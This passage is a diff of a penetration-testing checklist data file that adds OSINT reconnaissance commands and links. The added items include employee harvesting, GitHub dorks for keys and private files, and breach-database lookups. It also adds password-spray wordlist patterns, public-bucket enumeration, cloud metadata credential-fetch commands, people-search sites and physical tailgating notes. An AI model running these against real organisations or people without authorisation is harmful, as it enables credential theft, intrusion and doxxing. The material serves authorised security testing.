+        "description": "Gather employee names, job titles, technology stack clues, organizational structure, and personal details from social media platforms. Build targeted user lists for password spraying.",
+        "commands": [
+          {
+            "desc": "LinkedIn Employee Harvesting",
+            "subdesc": "Enumerate employees, roles, and technology mentions from LinkedIn company pages. Build username lists from discovered names.",
+            "cmd": [
+              "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME>",
+              "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME> -s <SIZE> -d 3",
+              "crosslinked -f '{first}.{last}@target.com' -j 3 'Company Name'",
+              "crosslinked -f '{f}{last}@target.com' -j 3 'Company Name'"
+            ]
+          },
+          {
+            "desc": "LinkedIn Manual Recon Checklist",
+            "subdesc": "Manual intelligence gathering from LinkedIn profiles and company pages.",
+            "cmd": [
+              "1. Search company page → note employee count and key departments",
+              "2. Filter employees by 'IT', 'Security', 'Engineering', 'DevOps'",
+              "3. Note job titles → identify sysadmins, developers, DBAs",
+              "4. Check job postings → reveals technology stack and tools in use",
+              "5. Review employee posts → may leak internal tools, screenshots, configs",
+              "6. Check 'About' section → office locations, subsidiaries",
+              "7. Find C-suite/executives → high-value phishing targets"
+            ]
+          },
+          {
+            "desc": "Twitter / X OSINT",
+            "subdesc": "Search for company mentions, employee posts, and leaked information.",
+            "cmd": [
+              "https://twitter.com/search-advanced",
+              "from:@company_handle filter:links",
+              "to:@company_handle",
+              "\"target.com\" (password OR credential OR leak OR hack)",
+              "https://github.com/rmdir-rp/OSINT-twitter-tools"
+            ]
+          },
+          {
+            "desc": "Instagram / Snapchat / TikTok",
+            "subdesc": "Visual intelligence — office photos, badge photos, whiteboard content, screen captures.",
+            "cmd": [
+              "https://imginn.com/              # Instagram viewer without account",
+              "https://map.snapchat.com/         # Geotagged snaps near office locations",
+              "Search TikTok for company name and employee posts"
+            ]
+          },
+          {
+            "desc": "Social Media Aggregation Tools",
+            "subdesc": "Tools that search across multiple platforms simultaneously.",
+            "cmd": [
+              "sherlock <USERNAME>",
+              "sherlock <USERNAME> --print-found --output results.txt",
+              "social-analyzer --username <USERNAME> --metadata --extract --trim",
+              "maigret <USERNAME> --all-sites --pdf report.pdf"
+            ]
+          }
+        ]
       },
       {
         "id": "osint-8",
-        "name": "GitHub / Paste Sites",
-        "description": "Search GitHub, GitLab, Pastebin, and similar sites for leaked source code, API keys, credentials, or internal references tied to the target.",
-        "commands": []
+        "name": "GitHub / Code Repository Recon",
+        "description": "Search GitHub, GitLab, Bitbucket, and paste sites for leaked source code, API keys, credentials, internal references, and infrastructure details tied to the target.",
+        "commands": [
+          {
+            "desc": "GitHub Dork Searches",
+            "subdesc": "Use GitHub's search to find leaked secrets, internal code, and configuration files.",
+            "cmd": [
+              "org:targetcompany password",
+              "org:targetcompany secret",
+              "org:targetcompany api_key",
+              "org:targetcompany token",
+              "\"target.com\" password",
+              "\"target.com\" filename:.env",
+              "\"target.com\" filename:config",
+              "\"target.com\" filename:credentials",
+              "\"target.com\" extension:pem private",
+              "\"target.com\" extension:ppk",
+              "\"target.com\" extension:sql",
+              "\"target.com\" filename:wp-config.php",
+              "\"target.com\" filename:.htpasswd",
+              "\"target.com\" filename:.git-credentials",
+              "\"target.com\" filename:id_rsa",
+              "\"target.com\" filename:shadow path:etc",
+              "\"target.com\" filename:docker-compose",
+              "\"target.com\" filename:.npmrc _auth",
+              "\"target.com\" JDBC connection",
+              "\"target.com\" AWS_SECRET_ACCESS_KEY"
+            ]
+          },
+          {
+            "desc": "Automated Secret Scanning",
+            "subdesc": "Scan repositories for committed secrets, API keys, and credentials.",
+            "cmd": [
+              "trufflehog git https://github.com/targetcompany/repo.git",
+              "trufflehog github --org=targetcompany",
+              "trufflehog github --repo=https://github.com/targetcompany/repo.git --only-verified",
+              "gitleaks detect --source /path/to/repo --report-path gitleaks_report.json",
+              "gitleaks detect --source /path/to/repo -v",
+              "git-secrets --scan /path/to/repo"
+            ]
+          },
+          {
+            "desc": "Git History Mining",
+            "subdesc": "Check commit history for secrets that were committed then removed — they're still in the git log.",
+            "cmd": [
+              "git log --all --oneline | head -50",
+              "git log --all --diff-filter=D -- '*.env' '*.conf' '*.key'",
+              "git log --all -p -- '*.env'",
+              "git log --all --full-history -S 'password' -- '**/*.py' '**/*.js' '**/*.conf'",
+              "git log --all --full-history -S 'API_KEY'",
+              "git show <COMMIT_HASH>:<FILE_PATH>"
+            ]
+          },
+          {
+            "desc": "Paste Sites & Breach Data",
+            "subdesc": "Search paste sites and breach databases for leaked target information.",
+            "cmd": [
+              "https://pastebin.com/search?q=target.com",
+              "https://psbdmp.ws/                # Pastebin dump search",
+              "https://grep.app/                 # Search across GitHub repos",
+              "https://searchcode.com/           # Code search engine",
+              "https://publicwww.com/            # Source code search"
+            ]
+          },
+          {
+            "desc": "GitLab / Bitbucket",
+            "subdesc": "Don't forget non-GitHub code hosting platforms.",
+            "cmd": [
+              "Search gitlab.com for target.com references",
+              "Search bitbucket.org for target.com references",
+              "Check for self-hosted GitLab instances: gitlab.target.com, git.target.com"
+            ]
+          }
+        ]
       },
       {
         "id": "osint-9",
-        "name": "Automated Scripts",
-        "description": "End-to-end OSINT automation scripts that chain multiple tools together.",
+        "name": "Automated Recon Scripts",
+        "description": "End-to-end OSINT automation scripts that chain multiple tools together for comprehensive passive and active reconnaissance.",
         "commands": [
           {
             "desc": "Basic OSINT Recon Script",
-            "subdesc": "Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories. Comment out any sections you may not require.",
+            "subdesc": "Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories.",
             "cmd": [
               "#!/bin/bash",
               "",
@@ -616,17 +1029,110 @@ const checklistPhases = [
               "echo -e \"${RED} [+] Taking screenshots ... ${RESET}\"",
               "gowitness file -f \"$subdomain_path/alive.txt\" -P \"$screenshot_path/\" --no-http"
             ]
+          },
+          {
+            "desc": "Enhanced Recon Pipeline",
+            "subdesc": "Extended pipeline: subfinder + amass + crt.sh → deduplicate → httpx probe → nuclei scan → gowitness screenshots.",
+            "cmd": [
+              "#!/bin/bash",
+              "domain=$1",
+              "mkdir -p $domain/{subs,probes,screenshots,vulns}",
+              "",
+              "echo '[+] Passive subdomain enumeration...'",
+              "subfinder -d $domain -all -silent >> $domain/subs/all.txt",
+              "amass enum -passive -d $domain -silent >> $domain/subs/all.txt",
+              "curl -s \"https://crt.sh/?q=%25.$domain&output=json\" | jq -r '.[].name_value' 2>/dev/null >> $domain/subs/all.txt",
+              "assetfinder --subs-only $domain >> $domain/subs/all.txt",
+              "",
+              "echo '[+] Deduplicating...'",
+              "sort -u $domain/subs/all.txt -o $domain/subs/unique.txt",
+              "echo \"Found $(wc -l < $domain/subs/unique.txt) unique subdomains\"",
+              "",
+              "echo '[+] Probing live hosts...'",
+              "httpx -l $domain/subs/unique.txt -silent -sc -cl -title -td -o $domain/probes/alive.txt",
+              "",
+              "echo '[+] Running nuclei...'",
+              "nuclei -l $domain/probes/alive.txt -t cves/ -t takeovers/ -t exposures/ -o $domain/vulns/nuclei.txt",
+              "",
+              "echo '[+] Taking screenshots...'",
+              "gowitness file -f $domain/probes/alive.txt -P $domain/screenshots/ --no-http",
+              "",
+              "echo '[+] Done! Results in ./$domain/'"
+            ]
+          },
+          {
+            "desc": "Quick One-Liner Recon Chains",
+            "subdesc": "Fast one-liner pipelines for quick subdomain → probe → scan workflows.",
+            "cmd": [
+              "# Subdomain → live hosts → output",
+              "subfinder -d target.com -silent | httpx -silent -sc -title | tee results.txt",
+              "",
+              "# Subdomain → nuclei vulnerability scan",
+              "subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -o vulns.txt",
+              "",
+              "# crt.sh → probe → screenshot",
+              "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u | httpx -silent | gowitness pipe"
+            ]
           }
         ]
       },
       {
         "id": "osint-10",
+        "name": "ASN & BGP Infrastructure",
+        "description": "Map an organization's network infrastructure through ASN lookups, BGP routing data, and netblock discovery. Critical for scope expansion and identifying all IP ranges owned by the target.",
+        "commands": [
+          {
+            "desc": "ASN Discovery",
+            "subdesc": "Find the Autonomous System Number(s) associated with the target organization.",
+            "cmd": [
+              "whois -h whois.radb.net -- '-i origin AS<NUMBER>'",
+              "whois -h whois.cymru.com \" -v 10.10.10.5\"",
+              "dig +short TXT <IP_REVERSED>.origin.asn.cymru.com",
+              "curl -s 'https://api.bgpview.io/search?query_term=target' | jq",
+              "amass intel -org 'Target Company'"
+            ]
+          },
+          {
+            "desc": "BGP & ASN Lookup Services",
+            "subdesc": "Web-based tools for visualizing BGP routing and ASN relationships.",
+            "cmd": [
+              "https://bgp.he.net/               # Hurricane Electric BGP Toolkit",
+              "https://bgpview.io/               # ASN, prefix, and peer lookup",
+              "https://www.peeringdb.com/         # Peering database — data centers, IXPs",
+              "https://ipinfo.io/                # IP geolocation + ASN data",
+              "https://www.ultratools.com/tools/asnInfo"
+            ]
+          },
+          {
+            "desc": "Netblock / IP Range Enumeration",
+            "subdesc": "Once you have an ASN, enumerate all IP prefixes advertised by it.",
+            "cmd": [
+              "whois -h whois.radb.net -- '-i origin AS12345'",
+              "amass intel -asn <ASN_NUMBER>",
+              "curl -s 'https://api.bgpview.io/asn/<ASN_NUMBER>/prefixes' | jq '.data.ipv4_prefixes[].prefix'",
+              "nmap -sL 10.10.0.0/16 | grep 'Nmap scan report' | awk '{print $5}'"
+            ]
+          },
+          {
+            "desc": "Reverse IP / Shared Hosting Discovery",
+            "subdesc": "Find other domains/sites hosted on the same IP — identify shared infrastructure.",
+            "cmd": [
+              "https://dnslytics.com/reverse-ip",
+              "https://viewdns.info/reverseip/",
+              "https://www.bing.com/search?q=ip:10.10.10.5",
+              "shodan search 'ip:10.10.10.5'"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "osint-11",
         "name": "OSINT Reconnaissance: People",
-        "description": "Search for people, phone numbers, and voter registration records using public lookup services.",
+        "description": "Search for people, phone numbers, physical addresses, and voter registration records using public lookup services. Useful for social engineering preparation.",
         "commands": [
           {
             "desc": "People Search Engines",
-            "subdesc": "",
+            "subdesc": "Free and paid services for looking up individuals by name, phone, or email.",
             "cmd": [
               "https://www.whitepages.com/",
               "https://www.truepeoplesearch.com/",
@@ -636,54 +1142,35 @@ const checklistPhases = [
               "https://peekyou.com/",
               "https://www.411.com/",
               "https://www.spokeo.com/",
-              "https://thatsthem.com/"
+              "https://thatsthem.com/",
+              "https://www.beenverified.com/",
+              "https://pipl.com/"
             ]
           },
           {
             "desc": "Voter Registration Records",
-            "subdesc": "",
+            "subdesc": "Voter records can reveal addresses, party affiliation, and voting history — public records in many US states.",
             "cmd": [
               "https://voterrecords.com/"
             ]
           },
           {
             "desc": "Phone Number Lookup",
-            "subdesc": "",
+            "subdesc": "Reverse phone lookup services — identify phone owners and carrier info",
             "cmd": [
               "https://www.truecaller.com/",
               "https://calleridtest.com/",
-              "https://infobel.com/"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "osint-11",
-        "name": "OSINT Reconnaissance: Email",
-        "description": "Discover, verify, and harvest email addresses tied to a target domain.",
-        "commands": [
-          {
-            "desc": "Email Discovery & Harvesting",
-            "subdesc": "",
-            "cmd": [
-              "https://hunter.io/",
-              "https://phonebook.cz/",
-              "https://www.voilanorbert.com/"
+              "https://infobel.com/",
+              "https://www.phonevalidator.com/"
             ]
           },
           {
-            "desc": "Email Verification",
-            "subdesc": "",
+            "desc": "Public Records & Court Records",
+            "subdesc": "Search court filings, civil cases, and public records databases",
             "cmd": [
-              "https://tools.verifyemailaddress.io/",
-              "https://email-checker.net/validate"
-            ]
-          },
-          {
-            "desc": "Harvest emails from all public sources",
-            "subdesc": "",
-            "cmd": [
-              "theHarvester -d target.com -b all"
+              "https://www.judyrecords.com/      # Court record search",
+              "https://unicourt.com/              # US court records",
+              "https://www.publicrecords.com/"
             ]
           }
         ]
@@ -691,36 +1178,61 @@ const checklistPhases = [
       {
         "id": "osint-12",
         "name": "OSINT Reconnaissance: Usernames & Passwords",
-        "description": "Check for credential leaks, enumerate usernames across platforms, and identify reused accounts.",
+        "description": "Check for credential leaks in breach databases, enumerate usernames across platforms, and identify password reuse patterns. Critical for password spraying preparation.",
         "commands": [
           {
             "desc": "Password Breach Databases",
-            "subdesc": "",
+            "subdesc": "Search for breached credentials tied to the target domain or specific email addresses.",
             "cmd": [
               "https://haveibeenpwned.com/",
               "https://weleakinfo.to/v2/",
               "https://leakcheck.io/",
               "https://snusbase.com/",
-              "https://scylla.sh/"
+              "https://scylla.sh/",
+              "https://dehashed.com/              # Paid — most comprehensive breach search",
+              "https://intelx.io/                 # Intelligence X — pastes, leaks, darknet"
+            ]
+          },
+          {
+            "desc": "Breach Data CLI Tools",
+            "subdesc": "Command-line tools for parsing and querying breach databases locally.",
+            "cmd": [
+              "h8mail -t target@target.com",
+              "h8mail -t target.com --all",
+              "pwndb2am4tzkvold.onion            # Tor hidden service — query breaches"
             ]
           },
           {
             "desc": "Username Enumeration (Online)",
-            "subdesc": "",
+            "subdesc": "Check if a username exists across hundreds of platforms.",
             "cmd": [
               "https://namechk.com/",
               "https://whatsmyname.app/",
-              "https://namecheckup.com/"
+              "https://namecheckup.com/",
+              "https://knowem.com/"
             ]
           },
           {
-            "desc": "Username Enumeration (Sherlock)",
-            "subdesc": "Sherlock searches 400+ social networks for matching usernames.",
+            "desc": "Username Enumeration (Sherlock & CLI)",
+            "subdesc": "Sherlock searches 400+ social networks (pip install sherlock-project). Maigret covers even more sites (pip install maigret). h8mail: pip install h8mail.",
             "cmd": [
               "sherlock <USERNAME>",
               "sherlock <USERNAME> --output results.txt",
               "sherlock <USERNAME> --print-found",
-              "sherlock <USER1> <USER2> <USER3>"
+              "sherlock <USER1> <USER2> <USER3>",
+              "maigret <USERNAME> --all-sites --pdf report.pdf",
+              "maigret <USERNAME> --top-sites 500"
+            ]
+          },
+          {
+            "desc": "Password Pattern Analysis",
+            "subdesc": "Common patterns found in breach data — useful for building targeted wordlists for spray attacks.",
+            "cmd": [
+              "Season+Year:    Winter2024!, Spring2024!, Summer2024!, Fall2024!",
+              "Company+Num:    TargetCo2024!, TargetCo123!, Target1!",
+              "Month+Year:     January2024!, March2024!",
+              "Common:         Password1!, Welcome1!, Changeme1!",
+              "Keyboard walks: Qwerty123!, !QAZ2wsx, 1qaz@WSX"
             ]
           }
         ]
@@ -728,121 +1240,423 @@ const checklistPhases = [
       {
         "id": "osint-13",
         "name": "OSINT Reconnaissance: Social Media",
-        "description": "Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, and TikTok.",
+        "description": "Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, Reddit, and TikTok. Look for employee posts, location data, and leaked information.",
         "commands": [
           {
             "desc": "Twitter / X",
-            "subdesc": "",
+            "subdesc": "Advanced Twitter search operators for targeted OSINT.",
             "cmd": [
               "https://twitter.com/search-advanced",
-              "https://github.com/rmdir-rp/OSINT-twitter-tools"
+              "from:@target_account",
+              "to:@target_account",
+              "\"target.com\" (password OR secret OR internal)",
+              "@target_account filter:links",
+              "@target_account until:2024-01-01 since:2023-01-01",
+              "https://github.com/rmdir-rp/OSINT-twitter-tools",
+              "twint -u <USERNAME> --email --phone"
             ]
           },
           {
             "desc": "Instagram",
-            "subdesc": "",
+            "subdesc": "View profiles and posts without an account. Look for office photos, badges, screens.",
             "cmd": [
-              "https://imginn.com/"
+              "https://imginn.com/",
+              "https://www.picuki.com/",
+              "https://dumpor.com/"
+            ]
+          },
+          {
+            "desc": "Reddit",
+            "subdesc": "Search for company mentions, employee complaints, and leaked information.",
+            "cmd": [
+              "site:reddit.com \"target.com\"",
+              "site:reddit.com \"Target Company\" (password OR credentials OR internal)",
+              "https://camas.unddit.com/          # Deleted Reddit comment search"
             ]
           },
           {
             "desc": "Snapchat",
-            "subdesc": "",
+            "subdesc": "Geotagged snaps — check Snap Map near target office locations.",
             "cmd": [
               "https://map.snapchat.com/"
+            ]
+          },
+          {
+            "desc": "Facebook",
+            "subdesc": "Employee groups, check-ins, and company page posts.",
+            "cmd": [
+              "site:facebook.com \"Target Company\"",
+              "https://www.facebook.com/search/   # People, posts, groups search"
             ]
           }
         ]
       },
       {
         "id": "osint-14",
-        "name": "OSINT Reconnaissance: Images",
-        "description": "Reverse image search and EXIF metadata extraction for location and device intelligence.",
+        "name": "OSINT Reconnaissance: Images & Geolocation",
+        "description": "Reverse image search, EXIF metadata extraction, and geolocation intelligence. Identify locations from photos, extract GPS coordinates, and trace image origins.",
         "commands": [
           {
             "desc": "Reverse Image Search",
-            "subdesc": "Most useful for identifying locations from background context like buildings, signs, and landmarks.",
+            "subdesc": "Upload or paste image URL to find where it appears online, identify locations from background context (buildings, signs, landmarks).",
             "cmd": [
               "https://images.google.com/",
               "https://tineye.com/",
-              "https://yandex.com/images/"
+              "https://yandex.com/images/",
+              "https://lens.google.com/",
+              "https://www.bing.com/images/search"
             ]
           },
           {
             "desc": "EXIF Metadata Extraction",
-            "subdesc": "Social media platforms strip EXIF data on upload, but direct file transfers and some websites preserve it.",
+            "subdesc": "Social media strips EXIF data on upload, but direct file transfers, email attachments, and some websites preserve it. EXIF can contain GPS coordinates, camera model, timestamps, and software used.",
             "cmd": [
               "exiftool <IMAGE_FILE>",
               "exiftool -gps* <IMAGE_FILE>",
-              "https://jimpl.com/"
+              "exiftool -s -G -a <IMAGE_FILE>",
+              "exiftool -r -ext jpg -ext png /path/to/directory/",
+              "identify -verbose <IMAGE_FILE>",
+              "https://jimpl.com/",
+              "https://exifdata.com/",
+              "https://www.metadata2go.com/"
+            ]
+          },
+          {
+            "desc": "Geolocation Tools",
+            "subdesc": "Determine location from images, landmarks, and other visual clues.",
+            "cmd": [
+              "https://www.google.com/maps/       # Street View for location verification",
+              "https://suncalc.org/               # Sun position calculator — determine time from shadows",
+              "https://www.openstreetmap.org/",
+              "https://overpass-turbo.eu/          # Query OpenStreetMap data"
             ]
           }
         ]
       },
       {
         "id": "osint-15",
-        "name": "OSINT Reconnaissance: Websites",
-        "description": "Fingerprint web technologies, analyze DNS records, scan for threats, and monitor website changes.",
+        "name": "OSINT Reconnaissance: Websites & Technology",
+        "description": "Fingerprint web technologies, analyze DNS records, scan for threats, discover certificates, and monitor website changes.",
         "commands": [
           {
-            "desc": "Technology Fingerprinting & DNS",
-            "subdesc": "",
+            "desc": "Technology Fingerprinting",
+            "subdesc": "Identify the tech stack, CMS, frameworks, and server software.",
             "cmd": [
               "https://builtwith.com/",
+              "https://www.wappalyzer.com/        # Browser extension — live tech detection",
+              "https://w3techs.com/",
+              "whatweb target.com",
+              "whatweb -a 3 target.com",
+              "wafw00f target.com                 # WAF detection"
+            ]
+          },
+          {
+            "desc": "DNS Intelligence & Reverse Lookup",
+            "subdesc": "Reverse IP, DNS history, and analytics-based domain discovery tools",
+            "cmd": [
               "https://centralops.net/co/",
               "https://dnslytics.com/reverse-ip",
               "https://spyonweb.com/",
-              "https://viewdns.info/"
+              "https://viewdns.info/",
+              "https://securitytrails.com/        # Historical DNS, subdomains, WHOIS"
+            ]
+          },
+          {
+            "desc": "Certificate Transparency",
+            "subdesc": "Find all certificates issued for a domain — reveals subdomains and infrastructure changes over time.",
+            "cmd": [
+              "https://crt.sh/",
+              "https://censys.io/certificates",
+              "https://dnsdumpster.com/",
+              "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u"
             ]
           },
           {
             "desc": "Threat Intelligence & Scanning",
-            "subdesc": "",
+            "subdesc": "Check domains/URLs/IPs against threat intelligence platforms.",
             "cmd": [
               "https://www.virustotal.com/",
               "https://urlscan.io/",
-              "https://web-check.as93.net/"
-            ]
-          },
-          {
-            "desc": "DNS & Certificate Transparency",
-            "subdesc": "",
-            "cmd": [
-              "https://dnsdumpster.com/",
-              "https://crt.sh/"
-            ]
-          },
-          {
-            "desc": "Infrastructure Discovery",
-            "subdesc": "",
-            "cmd": [
-              "https://shodan.io/",
-              "shodan search hostname:target.com",
-              "shodan host <TARGET_IP>"
+              "https://web-check.as93.net/",
+              "https://www.hybrid-analysis.com/",
+              "https://otx.alienvault.com/",
+              "https://threatcrowd.org/"
             ]
           },
           {
             "desc": "Website Monitoring & Historical Data",
-            "subdesc": "",
+            "subdesc": "Track changes, find cached content, and view historical snapshots.",
             "cmd": [
-              "https://visualping.io/",
-              "http://backlinkwatch.com/index.php",
-              "https://web.archive.org/"
+              "https://web.archive.org/           # Wayback Machine — historical snapshots",
+              "https://visualping.io/             # Monitor pages for changes",
+              "http://backlinkwatch.com/index.php  # Backlink analysis",
+              "https://archive.org/web/",
+              "curl -s 'https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey' | sort -u"
+            ]
+          },
+          {
+            "desc": "Subdomain & Infrastructure Discovery",
+            "subdesc": "Internet-wide scanners for discovering exposed services and infrastructure",
+            "cmd": [
+              "https://shodan.io/",
+              "https://search.censys.io/",
+              "shodan search hostname:target.com",
+              "shodan host <TARGET_IP>"
             ]
           }
         ]
       },
       {
         "id": "osint-16",
-        "name": "OSINT Reconnaissance: Business",
-        "description": "Investigate corporate registrations, organizational structure, and business intelligence.",
+        "name": "OSINT Reconnaissance: Business & Financial",
+        "description": "Investigate corporate registrations, organizational structure, subsidiaries, acquisitions, financial filings, and business intelligence for social engineering and scope expansion.",
         "commands": [
           {
             "desc": "Corporate Registry & Business Intelligence",
-            "subdesc": "",
+            "subdesc": "Look up company registration, officers, filings, and subsidiary relationships.",
             "cmd": [
-              "https://opencorporates.com/",
-              "https://www.aihitdata.com/"
+              "https://opencorporates.com/        # Global corporate registry search",
+              "https://www.aihitdata.com/          # Company + technology intelligence",
+              "https://www.crunchbase.com/         # Funding, acquisitions, leadership",
+              "https://www.sec.gov/cgi-bin/browse-edgar  # SEC filings (US public companies)",
+              "https://www.dnb.com/                # Dun & Bradstreet business data"
+            ]
+          },
+          {
+            "desc": "Subsidiary & Acquisition Discovery",
+            "subdesc": "Acquisitions often mean inherited infrastructure with different security posture — check for scope expansion.",
+            "cmd": [
+              "Search SEC filings (10-K, 10-Q) for subsidiary disclosures",
+              "Check Crunchbase for acquisitions history",
+              "Search for '[Company] acquisition' in news sources",
+              "Look for different domain registrations under same registrant email/org"
+            ]
+          },
+          {
+            "desc": "Job Postings Intelligence",
+            "subdesc": "Job listings reveal technology stack, security tools, compliance frameworks, and organizational priorities.",
+            "cmd": [
+              "site:linkedin.com/jobs 'Target Company'",
+              "site:indeed.com 'Target Company' (security OR engineer OR admin)",
+              "site:glassdoor.com 'Target Company'",
+              "Look for: tech stack in requirements, security tools, compliance mentions (SOC2, PCI, HIPAA)"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "osint-17",
+        "name": "Wireless & Physical OSINT",
+        "description": "Discover wireless networks, physical locations, and physical security details related to the target. Useful for wireless and physical pentests.",
+        "commands": [
+          {
+            "desc": "Wireless Network Discovery",
+            "subdesc": "WiGLE maps WiFi networks globally. Search by SSID, MAC address, or geographic area to find target wireless infrastructure.",
+            "cmd": [
+              "https://wigle.net/                 # Wireless network mapping database",
+              "Search WiGLE by SSID: target, TargetCompany, Target-Guest, etc.",
+              "Search WiGLE by geographic coordinates near target office locations",
+              "Export results for offline analysis"
+            ]
+          },
+          {
+            "desc": "Physical Location Intelligence",
+            "subdesc": "Map and analyze physical locations for onsite assessment preparation.",
+            "cmd": [
+              "https://www.google.com/maps        # Street View for building exterior recon",
+              "https://www.google.com/earth        # Aerial/satellite imagery",
+              "https://apps.apple.com/app/maps     # Apple Maps Look Around",
+              "Check for: entry points, security cameras, badge readers, dumpsters, smoking areas",
+              "Note: reception desk location, visitor sign-in process, tail-gating opportunities"
+            ]
+          },
+          {
+            "desc": "Company Infrastructure OSINT",
+            "subdesc": "Discover data center locations, cloud providers, and email infrastructure",
+            "cmd": [
+              "Search for data center locations (PeeringDB, company website)",
+              "Check cloud provider usage (dig for AWS/Azure/GCP DNS patterns)",
+              "dig target.com | grep -E 'amazonaws|azure|google'",
+              "Check MX records for email provider: dig +short target.com MX"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "osint-18",
+        "name": "Cloud & Infrastructure OSINT",
+        "description": "Discover cloud assets, exposed storage buckets, serverless functions, and cloud-hosted infrastructure tied to the target — no authentication required.",
+        "commands": [
+          {
+            "desc": "S3 Bucket Discovery",
+            "subdesc": "Find exposed AWS S3 buckets belonging to the target.",
+            "cmd": [
+              "https://grayhatwarfare.com/        # Search exposed S3 and Azure buckets",
+              "aws s3 ls s3://target-company/ --no-sign-request",
+              "aws s3 ls s3://target-company-backup/ --no-sign-request",
+              "aws s3 ls s3://target-company-dev/ --no-sign-request",
+              "aws s3 ls s3://target-prod/ --no-sign-request",
+              "cloud_enum -k target -k targetcompany -l cloud_results.txt"
+            ]
+          },
+          {
+            "desc": "Azure & GCP Storage",
+            "subdesc": "Check for exposed Azure Blob Storage containers and GCP Storage buckets",
+            "cmd": [
+              "# Azure Blob Storage",
+              "curl -s 'https://target.blob.core.windows.net/\\$web?restype=container&comp=list'",
+              "# GCP Storage",
+              "curl -s 'https://storage.googleapis.com/target-company/'",
+              "# Multi-cloud enumeration",
+              "cloud_enum -k target -k targetcompany --disable-aws -l azure_gcp_results.txt"
+            ]
+          },
+          {
+            "desc": "Cloud DNS Patterns",
+            "subdesc": "Identify which cloud providers the target uses from DNS records.",
+            "cmd": [
+              "dig +short target.com A | xargs -I{} whois {} | grep -i 'amazon\\|azure\\|google\\|cloudflare'",
+              "dig +short target.com CNAME",
+              "host target.com | grep -E 'elb.amazonaws|azurewebsites|appspot|cloudfront|herokuapp'",
+              "nslookup target.com | grep -E 'amazonaws|azure|google'"
+            ]
+          },
+          {
+            "desc": "Cloud Metadata & Configuration Checks",
+            "subdesc": "If you find any SSRF or have initial access, check for cloud metadata endpoints.",
+            "cmd": [
+              "# AWS Metadata (from SSRF or instance)",
+              "curl http://169.254.169.254/latest/meta-data/",
+              "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+              "# Azure Metadata",
+              "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+              "# GCP Metadata",
+              "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/'"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "osint-19",
+        "name": "Document & Metadata Analysis",
+        "description": "Extract metadata from publicly available documents (PDFs, Office files, images) to discover usernames, software versions, internal paths, and email addresses.",
+        "commands": [
+          {
+            "desc": "Download Public Documents",
+            "subdesc": "First, collect documents from the target's website using Google dorks and wget.",
+            "cmd": [
+              "# Find documents via Google",
+              "site:target.com filetype:pdf",
+              "site:target.com filetype:docx",
+              "site:target.com filetype:xlsx",
+              "site:target.com filetype:pptx",
+              "",
+              "# Bulk download discovered documents",
+              "wget -r -l 1 -A pdf,doc,docx,xls,xlsx,ppt,pptx https://target.com/",
+              "metagoofil -d target.com -t pdf,doc,docx,xls,xlsx -l 100 -o target_docs/ -f results.html"
+            ]
+          },
+          {
+            "desc": "Extract Metadata (exiftool)",
+            "subdesc": "exiftool extracts all metadata from files — creator names become usernames, internal paths reveal directory structures, software versions identify attack surface.",
+            "cmd": [
+              "exiftool *.pdf",
+              "exiftool -r -ext pdf -ext docx -ext xlsx target_docs/",
+              "exiftool *.pdf | grep -Ei 'author|creator|producer|company|email'",
+              "exiftool *.pdf | grep -Ei 'software|application|version'",
+              "exiftool *.docx | grep -Ei 'author|last.modified|company|template'"
+            ]
+          },
+          {
+            "desc": "FOCA (Windows)",
+            "subdesc": "FOCA automates metadata extraction from documents and network analysis. Windows GUI tool.",
+            "cmd": [
+              "Run FOCA → New Project → Enter target domain",
+              "Search All → Download All Documents",
+              "Extract Metadata → Analyze → Users, Servers, Emails, Software"
+            ]
+          },
+          {
+            "desc": "What to Look For in Metadata",
+            "subdesc": "Types of intelligence extractable from document metadata.",
+            "cmd": [
+              "Author/Creator      → Internal usernames (for login spraying)",
+              "Company              → Business unit names, subsidiaries",
+              "Software/Producer    → Internal tool versions (Office, Acrobat, OS)",
+              "Internal paths       → Directory structures (C:\\Users\\jsmith\\...)",
+              "Email addresses      → Confirm email format (first.last@target.com)",
+              "Creation dates       → Timeline of document activity",
+              "Printer names        → Internal network device names",
+              "GPS coordinates      → Office locations (from photos in docs)"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "osint-20",
+        "name": "Web Application Fingerprinting",
+        "description": "Identify web technologies, CMS versions, WAF presence, JavaScript libraries, and server configurations before active testing begins.",
+        "commands": [
+          {
+            "desc": "Automated Technology Detection",
+            "subdesc": "Identify CMS, frameworks, server software, CDN, and security products.",
+            "cmd": [
+              "whatweb target.com",
+              "whatweb -a 3 -v target.com",
+              "wafw00f target.com",
+              "wafw00f -a target.com",
+              "httpx -u target.com -tech-detect -status-code -title -server -cdn",
+              "nuclei -u target.com -t technologies/ -silent"
+            ]
+          },
+          {
+            "desc": "CMS Detection",
+            "subdesc": "Identify specific CMS platforms and their versions for targeted exploitation.",
+            "cmd": [
+              "# WordPress",
+              "wpscan --url target.com --enumerate vp,vt,u --api-token <TOKEN>",
+              "curl -s target.com | grep 'wp-content\\|wp-includes'",
+              "",
+              "# Joomla",
+              "joomscan --url target.com",
+              "",
+              "# Drupal",
+              "droopescan scan drupal -u target.com",
+              "",
+              "# Generic CMS detection",
+              "cmseek -u target.com"
+            ]
+          },
+          {
+            "desc": "HTTP Header Analysis",
+            "subdesc": "Response headers leak server info, framework versions, and security configurations.",
+            "cmd": [
+              "curl -I target.com",
+              "curl -sI target.com | grep -Ei 'server|x-powered|x-aspnet|x-generator'",
